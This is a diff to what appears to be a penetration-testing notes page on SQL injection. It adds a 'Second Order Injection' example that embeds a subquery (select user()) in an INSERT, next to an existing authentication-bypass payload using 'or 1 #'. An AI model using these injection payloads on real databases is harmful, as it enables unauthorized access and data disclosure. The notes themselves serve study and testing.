@@ -29,6 +29,14 @@ mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-17-16-16-06.png)
 
+### Second Order Injection
+
+```sql
+mysql> insert into accounts (username, password, mysignature) values ('admin','mynewpass',(select user())) # 'mynewsignature');
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-17-16-57-24.png)
+
 ## Time Based SQL Injection
 
 ### Sleep Invokation
